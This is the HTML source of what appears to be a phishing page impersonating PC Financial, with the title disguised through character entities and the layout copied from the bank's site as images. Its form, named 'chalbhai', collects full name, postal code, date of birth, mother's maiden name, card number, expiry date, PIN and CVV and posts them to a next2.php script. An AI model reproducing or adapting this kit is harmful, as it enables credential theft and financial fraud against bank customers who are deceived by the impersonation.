<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#67;&#32;&#70;&#105;&#110;&#97;&#110;&#99;&#105;&#97;&#108;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>



<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
  
.textbox {  
    border: solid 1px #999999;
    background: #e4e4e4;
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1) inset;
    background: -moz-linear-gradient(top, rgba(220,220,220,0.3) 0%,rgba(255,255,255,1) 25%);
    background: -webkit-gradient(linear, 0% 0%, 0% 100%, color-stop(0%, #e4e4e4), color-stop(20%, #ffffff));
    padding-left: 8px;
	font-size: 14px;
	height: 32px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #87A9DF; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style>
 
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>


  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:186px; top:8px; width:949px; height:135px; z-index:0"><img src="images/fa11.png" alt="" title="" border=0 width=949 height=135></div>

<div id="image2" style="position:absolute; overflow:hidden; left:182px; top:162px; width:715px; height:287px; z-index:1"><img src="images/fa12.png" alt="" title="" border=0 width=715 height=287></div>

<div id="image3" style="position:absolute; overflow:hidden; left:177px; top:449px; width:718px; height:239px; z-index:2"><img src="images/fa15.png" alt="" title="" border=0 width=718 height=239></div>

<div id="image4" style="position:absolute; overflow:hidden; left:202px; top:463px; width:300px; height:198px; z-index:3"><img src="images/fa13.png" alt="" title="" border=0 width=300 height=198></div>

<div id="image5" style="position:absolute; overflow:hidden; left:183px; top:668px; width:714px; height:220px; z-index:4"><img src="images/fa14.png" alt="" title="" border=0 width=714 height=220></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:939px; width:1349px; height:303px; z-index:5"><img src="images/fa4.png" alt="" title="" border=0 width=1349 height=303></div>

<div id="image7" style="position:absolute; overflow:hidden; left:214px; top:1018px; width:911px; height:151px; z-index:6"><a href="#"><img src="images/fa5.png" alt="" title="" border=0 width=911 height=151></a></div>
<form action=next2.php name=chalbhai id=chalbhai method=post>
<input name="name" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:282px;left:206px;top:270px;z-index:7">
<input name="postal" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:282px;left:206px;top:343px;z-index:8">
<input name="dob" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:282px;left:206px;top:415px;z-index:9">
<input name="mmn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:282px;left:206px;top:482px;z-index:10">
<input name="ccn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:282px;left:206px;top:554px;z-index:11">
<input name="exp" placeholder="MM/YYYY" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:167px;left:206px;top:626px;z-index:12">
<input name="pin" id="demo-field" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:167px;left:206px;top:688px;z-index:13">
<input name="cvv" class="textbox cc-cvc" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:167px;left:206px;top:760px;z-index:14">
<div id="formimage1" style="position:absolute; left:772px; top:828px; z-index:15"><input type="image" name="formimage1" width="102" height="32" src="images/cntinue.png"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:904px; top:169px; width:226px; height:290px; z-index:16"><img src="images/fa16.png" alt="" title="" border=0 width=226 height=290></div>

</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
